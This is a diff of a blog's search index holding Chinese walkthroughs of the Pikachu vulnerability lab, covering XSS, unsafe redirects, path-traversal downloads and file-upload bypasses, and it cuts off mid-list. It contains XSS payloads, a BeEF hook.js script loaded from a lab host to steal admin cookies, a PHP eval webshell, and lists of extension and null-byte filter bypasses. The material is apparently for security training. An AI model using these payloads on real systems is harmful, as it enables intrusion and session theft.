-<h1 id="xss之js输出"><a href="#xss之js输出" class="headerlink" title="xss之js输出"></a>xss之js输出</h1><p>根据提示输入tmac</p>
-<p><img src="/images/image-20230109094736189.png" alt="image-20230109094736189"></p>
-<p>前端查看js代码</p>
-<p><img src="/images/image-20230109094912346.png" alt="image-20230109094912346"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">	$ms=&#x27;tmac&#x27;;</span><br><span class="line">    if($ms.length != 0)&#123;</span><br><span class="line">        if($ms == &#x27;tmac&#x27;)&#123;</span><br><span class="line">            $(&#x27;#fromjs&#x27;).text(&#x27;tmac确实厉害,看那小眼神..&#x27;)</span><br><span class="line">        &#125;else &#123;</span><br><span class="line">//            alert($ms);</span><br><span class="line">            $(&#x27;#fromjs&#x27;).text(&#x27;无论如何不要放弃心中所爱..&#x27;)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-<p>再随便输入一串字符</p>
-<p><img src="/images/image-20230109095120480.png" alt="image-20230109095120480"></p>
-<p>传入的字符会被放进该$ms，于是我们就可以构造闭合</p>
-<h2 id="解题-1"><a href="#解题-1" class="headerlink" title="解题"></a>解题</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;/script&gt;&lt;script&gt;alert(123)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<p>先使用闭合前面的<script>，再执行自己的payload</p>
-<p><img src="/images/image-20230109095418811.png" alt="image-20230109095418811"></p>
-<p>这些题的逻辑都类似，找闭合，绕过过滤，绕过实体转换</p>
-<h1 id="XSS之盲打"><a href="#XSS之盲打" class="headerlink" title="XSS之盲打"></a>XSS之盲打</h1><p>盲打指的是一种攻击场景</p>
-<p>在留言框或姓名中插入Payload测试，根据提示登录到后台查看留言的信息，直接触发XSS</p>
-<p>先随便输入一些内容</p>
-<p><img src="/images/image-20230108023741293.png" alt="image-20230108023741293"></p>
-<p>提示给出了后台地址</p>
-<p><img src="/images/image-20230108023827084.png" alt="image-20230108023827084"></p>
-<p>根据提示登录</p>
-<p><img src="/images/image-20230108024052825.png" alt="image-20230108024052825"></p>
-<p>可以看到我们输入的内容</p>
-<p><img src="/images/image-20230108024128492.png" alt="image-20230108024128492"></p>
-<p>该场景叫做盲打也是因为这个，插入xss payload后，我们只能等待管理员点击从而利用</p>
-<p>数据库中能够看到插入的payload</p>
-<p><img src="/images/image-20230108030928953.png" alt="image-20230108030928953"></p>
-<p>所以也属于存储型XSS</p>
-<h2 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h2><p>这里可以用之前的BEEF平台进行利用</p>
-<p>这里先使用alert弹窗进行测试</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(111)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/image-20230108025041967.png" alt="image-20230108025041967"></p>
-<p>当管理员登录后台后，就会出现弹窗</p>
-<p><img src="/images/image-20230108025123698.png" alt="image-20230108025123698"></p>
-<p>pikachu有自己的XSS平台</p>
-<p><img src="/images/image-20230108030049268.png" alt="image-20230108030049268"></p>
-<p>需要提前配置数据库</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pikachu\inc\config.inc.php</span><br></pre></td></tr></table></figure>
-
-<p>安装初始化即可</p>
-<p><img src="/images/image-20230108030444690.png" alt="image-20230108030444690"></p>
-<p>这里我们使用beef进行测试</p>
-<p>具体使用在《BeEF xss利用框架安装使用.md》中有说明</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script src=&quot;http://192.168.28.150:3000/hook.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/image-20230108170625920.png" alt="image-20230108170625920"></p>
-<p>管理员登录到后台后</p>
-<p>可以看到beef这边已有主机信息，包括cookie等</p>
-<p><img src="/images/image-20230108170850091.png" alt="image-20230108170850091"></p>
-<h1 id="xss之href输出"><a href="#xss之href输出" class="headerlink" title="xss之href输出"></a>xss之href输出</h1><p>该题如果输出的信息为<a href="http://www.baidu.com时则正常输出,反之则将输入的值使用htmlspecialchars()函数进行转换/">www.baidu.com时则正常输出，反之则将输入的值使用htmlspecialchars()函数进行转换</a></p>
-<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;&quot;&lt;&gt;#?</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/image-20230109094424113.png" alt="image-20230109094424113"></p>
-<p>可以发现压根没有闭合等，输入啥就是啥</p>
-<h2 id="解题-2"><a href="#解题-2" class="headerlink" title="解题"></a>解题</h2><p>可以使用javascript协议来执行js，当点击超链接时会执行该js脚本实现弹窗</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">javascript:alert(123)</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/image-20230109094619596.png" alt="image-20230109094619596"></p>
-<p>点击触发</p>
-<p><img src="/images/image-20230109094603430.png" alt="image-20230109094603430"></p>
-<h2 id="javascript协议"><a href="#javascript协议" class="headerlink" title="javascript协议"></a>javascript协议</h2><p>将javascript代码添加到客户端的方法是把它放置在伪协议说明符javascript:后的URL中。</p>
-<p>这个特殊的协议类型声明了URL的主体是任意的javascript代码，它由javascript的解释器运行。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">javascript:alert(123)</span><br></pre></td></tr></table></figure>
-
-<p>实际上是将javascript:后面的代码当JavaScript来执行，并将结果值返回给当前页面。</p>
-<h1 id="xss之htmlspecialchars"><a href="#xss之htmlspecialchars" class="headerlink" title="xss之htmlspecialchars"></a>xss之htmlspecialchars</h1><p>主要是对htmlspecialchars()函数进行绕过</p>
-<p>htmlspecialchars()是PHP里面把预定义的字符转换为HTML实体的函数</p>
-<p><img src="/images/image-20230109091304591.png" alt="image-20230109091304591"></p>
-<h2 id="测试-1"><a href="#测试-1" class="headerlink" title="测试"></a>测试</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;&quot;&lt;&gt;#?</span><br></pre></td></tr></table></figure>
-
-<p>注意需要先用一个单引号将href的双引号闭合后才能看出结果</p>
-<p><img src="/images/image-20230109092023309.png" alt="image-20230109092023309"></p>
-<p>根据上方返回的信息可以看到字符双引号，<，>都被转换成了HTML实体函数(默认不对'进行处理)</p>
-<h2 id="解题-3"><a href="#解题-3" class="headerlink" title="解题"></a>解题</h2><p>寻找闭合，避开被转换的字符</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; onclick=alert(123) &#x27;</span><br></pre></td></tr></table></figure>
-
-<p>点击触发</p>
-<p><img src="/images/image-20230109092702680.png" alt="image-20230109092702680"></p>
-<h2 id="参考-2"><a href="#参考-2" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.cnblogs.com/escape-w/p/10162831.html">https://www.cnblogs.com/escape-w/p/10162831.html</a></p>
-</script></p>]]></content>
-      <categories>
-        <category>pikachu靶场系列</category>
-      </categories>
-  </entry>
-  <entry>
     <title>pikachu靶场系列-不安全的URL跳转</title>
     <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84URL%E8%B7%B3%E8%BD%AC/</url>
     <content><![CDATA[<p>如果后端采用了前端传进来的参数作为跳转的目的地，又没有做判断就可能跳转到钓鱼网站等恶意链接。</p>
@@ -778,135 +711,6 @@
 <p><img src="/images/image-20230110155246615.png" alt="image-20230110155246615"></p>
 <p>可以看到302响应包中的location字段指向百度</p>
 ]]></content>
-      <categories>
-        <category>pikachu靶场系列</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>pikachu靶场系列-不安全的文件下载</title>
-    <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/</url>
-    <content><![CDATA[<h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>当存在文件下载功能时，如果没有做好限制，则可能会造成任意文件下载，源码泄露等严重后果</p>
-<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>抓取下载功能的数据包</p>
-<p><img src="/images/image-20230110105403955.png" alt="image-20230110105403955"></p>
-<p>文件下载的url为</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/unsafedownload/execdownload.php?filename=mbl.png</span><br></pre></td></tr></table></figure>
-
-<p>如果未做好限制，则会造成任意文件下载</p>
-<h5 id="源码泄露"><a href="#源码泄露" class="headerlink" title="源码泄露"></a>源码泄露</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/unsafedownload/execdownload.php?filename=../../../../../index.php</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/image-20230110105601275.png" alt="image-20230110105601275"></p>
-]]></content>
-      <categories>
-        <category>pikachu靶场系列</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>pikachu靶场系列-文件上传</title>
-    <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
-    <content><![CDATA[<h1 id="客户端校验"><a href="#客户端校验" class="headerlink" title="客户端校验"></a>客户端校验</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php eval($_POST[123]);?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>首先保存一个shell.php用于上传</p>
-<p>当上传时，会显示文件不符合要求</p>
-<p><img src="/images/image-20230110110325044.png" alt="image-20230110110325044"></p>
-<p>其实弹窗已经可以初步判断是客户端校验了</p>
-<p>也可以抓个包试试，当弹窗时并不会抓到任何数据包，所以为客户端校验</p>
-<p><img src="/images/image-20230110110530561.png" alt="image-20230110110530561"></p>
-<p>F12查看前端代码，可以看到使用了checkFileExt()函数用于校验上传的文件</p>
-<p><img src="/images/image-20230110110937647.png" alt="image-20230110110937647"></p>
-<p>直接将其删除</p>
-<p>此时再上传就不会有任何问题</p>
-<p><img src="/images/image-20230110110655236.png" alt="image-20230110110655236"></p>
-<p>蚁剑成功连接</p>
-<p><img src="/images/image-20230110110914717.png" alt="image-20230110110914717"></p>
-<h1 id="文件上传后缀名绕过"><a href="#文件上传后缀名绕过" class="headerlink" title="文件上传后缀名绕过"></a>文件上传后缀名绕过</h1><h3 id="0x81-贼好用"><a href="#0x81-贼好用" class="headerlink" title="0x81(贼好用)"></a>0x81(贼好用)</h3><p>0x82 0x83也可</p>
-<p>但同样为保留字符的0x80不行</p>
-<p>在文件后缀名后的hex添加一个81</p>
-<p><img src="/images/1667316762281-743e5c7b-0a8f-4047-a9e0-1006667f97f1.png" alt="img"></p>
-<p>0x81是一个很特殊的存在，也不是空格(0x20)，应该是代表空值</p>
-<p><img src="/images/1667317009753-4ceb4d26-4654-4512-befc-1fd4c7224fd9.png" alt="img"></p>
-<p>在java中0x81可能是编码 GBK 的不可映射字符 (0x81)</p>
-<h3 id="大小写"><a href="#大小写" class="headerlink" title="大小写"></a>大小写</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.Php .pHp .phP</span><br></pre></td></tr></table></figure>
-
-<h3 id="空格"><a href="#空格" class="headerlink" title="空格"></a>空格</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">webshell. php</span><br><span class="line"></span><br><span class="line">webshell.php(空格)</span><br></pre></td></tr></table></figure>
-
-<h3 id="DATA"><a href="#DATA" class="headerlink" title="::$DATA"></a>::$DATA</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">::$DATA</span><br></pre></td></tr></table></figure>
-
-<p>windows下的php，在文件名后面加上::$DATA系统会把它当作文件流来进行处理，不会检测文件的后缀名，且保留::$DATA之前的文件名以及后缀</p>
-<h3 id="绕过"><a href="#绕过" class="headerlink" title=".绕过"></a>.绕过</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">webshell..php</span><br><span class="line"></span><br><span class="line">webshell.php.</span><br><span class="line"></span><br><span class="line">webshell.php. .</span><br></pre></td></tr></table></figure>
-
-<h3 id="双写后缀名"><a href="#双写后缀名" class="headerlink" title="双写后缀名"></a>双写后缀名</h3><p>有些站点判断方式会把文件后缀名替换为空字符，遇到这种情况我们只需要双写后缀名来绕过</p>
-<p>例如</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">webshell.phphpp</span><br></pre></td></tr></table></figure>
-
-<p>原理就是服务器把后缀名中的php进行替换，替换成空字符之后为被替换的剩余字符组成了php，从而达到绕过的效果</p>
-<h3 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h3><p>%00截断经常用在服务端把文件路径和文件名加在一起进行判断后缀，</p>
-<p>例如</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/upload/webshell.php%00webshell.jpg</span><br></pre></td></tr></table></figure>
-
-<p>在这里系统解析的时候会自动忽略%00后面的内容，最终解析为&#x2F;upload&#x2F;webshell.php</p>
-<p>从而达到绕过的目的</p>
-<p><img src="/images/1667314977664-cbd64322-4a65-4a0d-a6e0-b7eb1f07f94f.png" alt="img"></p>
-<h3 id="后缀嵌套"><a href="#后缀嵌套" class="headerlink" title="后缀嵌套"></a>后缀嵌套</h3><p>用于服务器从前往后将发现的php去除后保存的站点</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">phpshell.pphphp</span><br></pre></td></tr></table></figure>
-
-<h3 id="另类后缀名"><a href="#另类后缀名" class="headerlink" title="另类后缀名"></a>另类后缀名</h3><p>还可以尝试一些近似的后缀名</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> asp:asa/cer/cdx</span><br><span class="line"> aspx:ashx/asax/ascx/asmx</span><br><span class="line"> php:phtml/php1/php2//php3/php4/php5/pht/</span><br><span class="line"> jsp:jspx/jspa/jsw/jsv/jspf/jhtml</span><br><span class="line">php</span><br><span class="line">php2</span><br><span class="line">php3</span><br><span class="line">php4</span><br><span class="line">php5</span><br><span class="line">pHp</span><br><span class="line">pHp2</span><br><span class="line">pHp3</span><br><span class="line">pHp4</span><br><span class="line">pHp5</span><br><span class="line">html</span><br><span class="line">htm</span><br><span class="line">phtml</span><br><span class="line">pht</span><br><span class="line">Html</span><br><span class="line">Htm</span><br><span class="line">pHtml</span><br><span class="line">asp</span><br><span class="line">aspx</span><br><span class="line">asa</span><br><span class="line">asax</span><br><span class="line">ashx</span><br><span class="line">asmx</span><br><span class="line">cer</span><br><span class="line">aSp</span><br><span class="line">aSpx</span><br><span class="line">aSa</span><br><span class="line">aSax</span><br><span class="line">aScx</span><br><span class="line">aShx</span><br><span class="line">aSmx</span><br><span class="line">cEr</span><br><span class="line">jsp</span><br><span class="line">jspa</span><br><span class="line">jspx</span><br><span class="line">jsw</span><br><span class="line">jxv</span><br><span class="line">jspf</span><br><span class="line">jtml</span><br><span class="line">JSp</span><br><span class="line">jSpx</span><br><span class="line">jSpa</span><br><span class="line">jSw</span><br><span class="line">jSv</span><br><span class="line">jSpf</span><br><span class="line">jHtml</span><br><span class="line">asp/test.jpg</span><br><span class="line">asp;.jpg</span><br><span class="line">cer/test.jpg</span><br><span class="line">cer;.jpg</span><br><span class="line">asa/test.jpg</span><br><span class="line">asa;.jpg</span><br><span class="line">aSp/test.jpg</span><br><span class="line">aSp;.jpg</span><br><span class="line">cEr/test.jpg</span><br><span class="line">cEr;.jpg</span><br><span class="line">aSa/test.jpg</span><br><span class="line">aSa;.jpg</span><br><span class="line">jpg/xx.php</span><br><span class="line">jpg/xx.pHp</span><br><span class="line">jpg/.php</span><br><span class="line">jpg/.pHp</span><br><span class="line">php.xs.aa</span><br><span class="line">php2.aa</span><br><span class="line">php3.aa</span><br><span class="line">php4.aa</span><br><span class="line">php5.aa</span><br><span class="line">pHp.aa</span><br><span class="line">pHp2.aa</span><br><span class="line">pHp3.aa</span><br><span class="line">pHp4.aaa</span><br><span class="line">pHp5.aa</span><br><span class="line">html.aa</span><br><span class="line">htm.aa</span><br><span class="line">phtml.aa</span><br><span class="line">pht.aaa</span><br><span class="line">Html.aaa</span><br><span class="line">Htm.aa</span><br><span class="line">pHtml.aa</span><br><span class="line">php::$DATA</span><br></pre></td></tr></table></figure>
-
-<h1 id="getimagesize"><a href="#getimagesize" class="headerlink" title="getimagesize()"></a>getimagesize()</h1><p>可以看一下网站源码</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(isset($_POST[&#x27;submit&#x27;]))&#123;</span><br><span class="line">    $type=array(&#x27;jpg&#x27;,&#x27;jpeg&#x27;,&#x27;png&#x27;);//指定类型</span><br><span class="line">    $mime=array(&#x27;image/jpg&#x27;,&#x27;image/jpeg&#x27;,&#x27;image/png&#x27;);</span><br><span class="line">    $save_path=&#x27;uploads&#x27;.date(&#x27;/Y/m/d/&#x27;);//根据当天日期生成一个文件夹</span><br><span class="line">    $upload=upload(&#x27;uploadfile&#x27;,&#x27;512000&#x27;,$type,$mime,$save_path);//调用函数</span><br><span class="line">    if($upload[&#x27;return&#x27;])&#123;</span><br><span class="line">        $html.=&quot;&lt;p class=&#x27;notice&#x27;&gt;文件上传成功&lt;/p&gt;&lt;p class=&#x27;notice&#x27;&gt;文件保存的路径为：&#123;$upload[&#x27;save_path&#x27;]&#125;&lt;/p&gt;&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $html.=&quot;&lt;p class=notice&gt;&#123;$upload[&#x27;error&#x27;]&#125;&lt;/p&gt;&quot;;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>服务端校验了文件的MIME和后缀，并且用的是白名单</p>
-<p>可以看到还校验了文件内容</p>
-<p><img src="/images/image-20230110112128136.png" alt="image-20230110112128136"></p>
-<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>1.文件内容添加</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br></pre></td></tr></table></figure>
-
-<p>这是gif文件的文件头</p>
-<p>其他的请求头可以参考《文件上传内容校验绕过》</p>
-<p>2.更改后缀为png</p>
-<p>3.更改MIME类型为image&#x2F;png</p>
-<p><img src="/images/image-20230110113115973.png" alt="image-20230110113115973"></p>
-<p>成功上传</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uploads/2023/01/10/27979263bcdba99b950336034711.png</span><br></pre></td></tr></table></figure>
-
-<p>由于后缀为png，所以这里需要配合文件包含进行利用</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">filename=../../unsafeupload/uploads/2023/01/10/27979263bcdba99b950336034711.png</span><br></pre></td></tr></table></figure>
-
-<p>url为</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/fileinclude/fi_local.php?filename=../../unsafeupload/uploads/2023/01/10/27979263bcdba99b950336034711.png&amp;submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2</span><br></pre></td></tr></table></figure>
-
-<p>成功连接webshell</p>
-<p><img src="/images/image-20230110133348854.png" alt="image-20230110133348854"></p>
-<h1 id="MIME-type"><a href="#MIME-type" class="headerlink" title="MIME type"></a>MIME type</h1><p>MIME类型用来告诉服务器，上传的文件内容是什么类型</p>
-<p>MIME校验就是服务器端限制上传文件的MIME，是一种服务端的校验</p>
-<p>MIME是由上传文件的body的Content-Type指定的</p>
-<p><img src="/images/image-20230110111354014.png" alt="image-20230110111354014"></p>
-<h3 id="常见的MIME类型"><a href="#常见的MIME类型" class="headerlink" title="常见的MIME类型"></a>常见的MIME类型</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">超文本标记语言文本 .html、.html：text/html</span><br><span class="line"></span><br><span class="line"> 普通文本 .txt： text/plain</span><br><span class="line"></span><br><span class="line"> RTF 文本 .rtf： application/rtf</span><br><span class="line"></span><br><span class="line"> GIF 图形 .gif： image/gif</span><br><span class="line"></span><br><span class="line"> JPEG 图形 .jpeg、.jpg： image/jpeg</span><br><span class="line"></span><br><span class="line"> au 声音文件 .au： audio/basic</span><br><span class="line"></span><br><span class="line"> MIDI 音乐文件 mid、.midi： audio/midi、audio/x-midi</span><br><span class="line"></span><br><span class="line"> RealAudio 音乐文件 .ra、.ram： audio/x-pn-realaudio</span><br><span class="line"></span><br><span class="line"> MPEG 文件 .mpg、.mpeg： video/mpeg</span><br><span class="line"></span><br><span class="line"> AVI 文件 .avi： video/x-msvideo</span><br><span class="line"></span><br><span class="line"> GZIP 文件 .gz： application/x-gzip</span><br><span class="line"></span><br><span class="line"> TAR 文件 .tar： application/x-tar</span><br><span class="line"> </span><br><span class="line"> png文件 image/png</span><br></pre></td></tr></table></figure>
-
-<h3 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h3><p>当上传webshell时</p>
-<p><img src="/images/image-20230110111246587.png" alt="image-20230110111246587"></p>
-<p>此时Content-Type指定的MIME类型为application&#x2F;octet-stream</p>
-<p>将其改为jpg或png的MIME类型</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jpg image/jpeg</span><br><span class="line"></span><br><span class="line">png image/png</span><br></pre></td></tr></table></figure>
-
-<p>成功上传</p>
-<p><img src="/images/image-20230110111611594.png" alt="image-20230110111611594"></p>
-<p>成功连接webshell</p>
-<p><img src="/images/image-20230110111625267.png" alt="image-20230110111625267"></p>
-<h1 id="文件上传内容校验绕过"><a href="#文件上传内容校验绕过" class="headerlink" title="文件上传内容校验绕过"></a>文件上传内容校验绕过</h1><h5 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h5><p>这里在使用的时候建议直接去修改hex中的16进制</p>
-<h5 id="常用"><a href="#常用" class="headerlink" title="常用"></a>常用</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PNG文件头: 89 50 4E 47 0D 0A 1A 0A </span><br><span class="line"></span><br><span class="line">JPG文件头: FF D8 FF</span><br><span class="line"></span><br><span class="line">GIF (gif)文件头：47494638</span><br></pre></td></tr></table></figure>
-
-<h5 id="GIF"><a href="#GIF" class="headerlink" title="GIF"></a>GIF</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br></pre></td></tr></table></figure>
-
-<h5 id="JPG"><a href="#JPG" class="headerlink" title="JPG"></a>JPG</h5><p>16进制文件头为</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FF D8 FF</span><br></pre></td></tr></table></figure>
-
-<h5 id="PNG"><a href="#PNG" class="headerlink" title="PNG"></a>PNG</h5><p>16进制文件头为</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">89 50 4E 47</span><br></pre></td></tr></table></figure>
-
-<h5 id="zip"><a href="#zip" class="headerlink" title="zip"></a>zip</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Zip Compressed</span><br></pre></td></tr></table></figure>
-
-<h5 id="doc-xls-xlt-ppt-apr"><a href="#doc-xls-xlt-ppt-apr" class="headerlink" title="doc;xls;xlt;ppt;apr"></a>doc;xls;xlt;ppt;apr</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MS Compound Document v1 or Lotus Approach APRfile</span><br></pre></td></tr></table></figure>]]></content>
       <categories>
         <category>pikachu靶场系列</category>
       </categories>
@@ -1495,6 +1299,523 @@
       </categories>
   </entry>
   <entry>
+    <title>pikachu靶场系列-文件上传</title>
+    <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
+    <content><![CDATA[<h1 id="客户端校验"><a href="#客户端校验" class="headerlink" title="客户端校验"></a>客户端校验</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php eval($_POST[123]);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>首先保存一个shell.php用于上传</p>
+<p>当上传时，会显示文件不符合要求</p>
+<p><img src="/images/image-20230110110325044.png" alt="image-20230110110325044"></p>
+<p>其实弹窗已经可以初步判断是客户端校验了</p>
+<p>也可以抓个包试试，当弹窗时并不会抓到任何数据包，所以为客户端校验</p>
+<p><img src="/images/image-20230110110530561.png" alt="image-20230110110530561"></p>
+<p>F12查看前端代码，可以看到使用了checkFileExt()函数用于校验上传的文件</p>
+<p><img src="/images/image-20230110110937647.png" alt="image-20230110110937647"></p>
+<p>直接将其删除</p>
+<p>此时再上传就不会有任何问题</p>
+<p><img src="/images/image-20230110110655236.png" alt="image-20230110110655236"></p>
+<p>蚁剑成功连接</p>
+<p><img src="/images/image-20230110110914717.png" alt="image-20230110110914717"></p>
+<h1 id="文件上传后缀名绕过"><a href="#文件上传后缀名绕过" class="headerlink" title="文件上传后缀名绕过"></a>文件上传后缀名绕过</h1><h3 id="0x81-贼好用"><a href="#0x81-贼好用" class="headerlink" title="0x81(贼好用)"></a>0x81(贼好用)</h3><p>0x82 0x83也可</p>
+<p>但同样为保留字符的0x80不行</p>
+<p>在文件后缀名后的hex添加一个81</p>
+<p><img src="/images/1667316762281-743e5c7b-0a8f-4047-a9e0-1006667f97f1.png" alt="img"></p>
+<p>0x81是一个很特殊的存在，也不是空格(0x20)，应该是代表空值</p>
+<p><img src="/images/1667317009753-4ceb4d26-4654-4512-befc-1fd4c7224fd9.png" alt="img"></p>
+<p>在java中0x81可能是编码 GBK 的不可映射字符 (0x81)</p>
+<h3 id="大小写"><a href="#大小写" class="headerlink" title="大小写"></a>大小写</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.Php .pHp .phP</span><br></pre></td></tr></table></figure>
+
+<h3 id="空格"><a href="#空格" class="headerlink" title="空格"></a>空格</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">webshell. php</span><br><span class="line"></span><br><span class="line">webshell.php(空格)</span><br></pre></td></tr></table></figure>
+
+<h3 id="DATA"><a href="#DATA" class="headerlink" title="::$DATA"></a>::$DATA</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">::$DATA</span><br></pre></td></tr></table></figure>
+
+<p>windows下的php，在文件名后面加上::$DATA系统会把它当作文件流来进行处理，不会检测文件的后缀名，且保留::$DATA之前的文件名以及后缀</p>
+<h3 id="绕过"><a href="#绕过" class="headerlink" title=".绕过"></a>.绕过</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">webshell..php</span><br><span class="line"></span><br><span class="line">webshell.php.</span><br><span class="line"></span><br><span class="line">webshell.php. .</span><br></pre></td></tr></table></figure>
+
+<h3 id="双写后缀名"><a href="#双写后缀名" class="headerlink" title="双写后缀名"></a>双写后缀名</h3><p>有些站点判断方式会把文件后缀名替换为空字符，遇到这种情况我们只需要双写后缀名来绕过</p>
+<p>例如</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">webshell.phphpp</span><br></pre></td></tr></table></figure>
+
+<p>原理就是服务器把后缀名中的php进行替换，替换成空字符之后为被替换的剩余字符组成了php，从而达到绕过的效果</p>
+<h3 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h3><p>%00截断经常用在服务端把文件路径和文件名加在一起进行判断后缀，</p>
+<p>例如</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/upload/webshell.php%00webshell.jpg</span><br></pre></td></tr></table></figure>
+
+<p>在这里系统解析的时候会自动忽略%00后面的内容，最终解析为&#x2F;upload&#x2F;webshell.php</p>
+<p>从而达到绕过的目的</p>
+<p><img src="/images/1667314977664-cbd64322-4a65-4a0d-a6e0-b7eb1f07f94f.png" alt="img"></p>
+<h3 id="后缀嵌套"><a href="#后缀嵌套" class="headerlink" title="后缀嵌套"></a>后缀嵌套</h3><p>用于服务器从前往后将发现的php去除后保存的站点</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">phpshell.pphphp</span><br></pre></td></tr></table></figure>
+
+<h3 id="另类后缀名"><a href="#另类后缀名" class="headerlink" title="另类后缀名"></a>另类后缀名</h3><p>还可以尝试一些近似的后缀名</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> asp:asa/cer/cdx</span><br><span class="line"> aspx:ashx/asax/ascx/asmx</span><br><span class="line"> php:phtml/php1/php2//php3/php4/php5/pht/</span><br><span class="line"> jsp:jspx/jspa/jsw/jsv/jspf/jhtml</span><br><span class="line">php</span><br><span class="line">php2</span><br><span class="line">php3</span><br><span class="line">php4</span><br><span class="line">php5</span><br><span class="line">pHp</span><br><span class="line">pHp2</span><br><span class="line">pHp3</span><br><span class="line">pHp4</span><br><span class="line">pHp5</span><br><span class="line">html</span><br><span class="line">htm</span><br><span class="line">phtml</span><br><span class="line">pht</span><br><span class="line">Html</span><br><span class="line">Htm</span><br><span class="line">pHtml</span><br><span class="line">asp</span><br><span class="line">aspx</span><br><span class="line">asa</span><br><span class="line">asax</span><br><span class="line">ashx</span><br><span class="line">asmx</span><br><span class="line">cer</span><br><span class="line">aSp</span><br><span class="line">aSpx</span><br><span class="line">aSa</span><br><span class="line">aSax</span><br><span class="line">aScx</span><br><span class="line">aShx</span><br><span class="line">aSmx</span><br><span class="line">cEr</span><br><span class="line">jsp</span><br><span class="line">jspa</span><br><span class="line">jspx</span><br><span class="line">jsw</span><br><span 